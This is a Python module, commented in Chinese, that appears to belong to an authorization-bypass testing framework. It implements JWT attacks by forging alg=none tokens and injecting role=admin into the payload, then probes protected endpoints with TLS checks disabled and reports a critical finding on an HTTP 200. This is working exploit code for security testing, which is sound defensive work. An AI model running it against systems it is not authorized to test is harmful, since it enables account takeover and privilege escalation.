"""JWT 攻击策略 — 算法混淆、密钥爆破、过期验证。"""
from __future__ import annotations

import base64
import json
import logging
from typing import Any, Dict, List

from .base import AuthBypassFinding, AuthBypassStrategy

logger = logging.getLogger(__name__)


class JWTAttackStrategy(AuthBypassStrategy):
    """JWT 攻击越权检测：算法混淆（none/HS256→RS256）、过期验证。"""

    @property
    def name(self) -> str:
        return "jwt_attack"

    @property
    def severity(self) -> str:
        return "critical"

    async def execute(self, target: Any, context: Dict[str, Any]) -> List[AuthBypassFinding]:
        """
        JWT 攻击检测：
        1. 算法混淆（将 RS256 改为 none 或 HS256）
        2. 过期 Token 验证
        """
        findings: List[AuthBypassFinding] = []
        valid_token = context.get("valid_token", "")
        endpoints = context.get("protected_endpoints", ["/api/user/profile"])
        base_url = getattr(target, "base_url", "")

        if not valid_token:
            logger.warning("JWT 攻击测试: 未提供有效 Token")
            return findings

        try:
            import httpx
            async with httpx.AsyncClient(base_url=base_url, verify=False) as client:
                # 测试 1: 算法 none 攻击
                none_token = self._forge_none_token(valid_token)
                if none_token:
                    for endpoint in endpoints:
                        response = await client.get(
                            endpoint,
                            headers={"Authorization": f"Bearer {none_token}"},
                        )
                        if response.status_code == 200:
                            findings.append(AuthBypassFinding(
                                strategy=self.name,
                                severity="critical",
                                endpoint=endpoint,
                                description="JWT 算法 none 攻击成功：无签名 Token 被接受",
                                evidence=f"使用 none 算法 Token 访问 {endpoint}，返回 200",
                            ))

                # 测试 2: 修改 payload 中的角色字段
                tampered_token = self._tamper_payload(valid_token, {"role": "admin"})
                if tampered_token:
                    for endpoint in endpoints:
                        response = await client.get(
                            endpoint,
                            headers={"Authorization": f"Bearer {tampered_token}"},
                        )
                        if response.status_code == 200:
                            findings.append(AuthBypassFinding(
                                strategy=self.name,
                                severity="critical",
                                endpoint=endpoint,
                                description="JWT 篡改攻击成功：修改 payload 后 Token 被接受",
                                evidence="修改 role=admin 后 Token 仍通过验证",
                            ))
        except ImportError:
            logger.error("httpx 未安装")
        except Exception as e:
            logger.error(f"JWT 攻击测试异常: {e}")

        return findings

    @staticmethod
    def _forge_none_token(token: str) -> str:
        """将 JWT 算法改为 none。"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return ""
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            header["alg"] = "none"
            new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
            return f"{new_header}.{parts[1]}."
        except Exception:
            return ""

    @staticmethod
    def _tamper_payload(token: str, extra: Dict[str, Any]) -> str:
        """修改 JWT payload（添加额外字段）。"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return ""
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
            payload.update(extra)
            new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
            return f"{parts[0]}.{new_payload}.{parts[2]}"
        except Exception:
            return ""
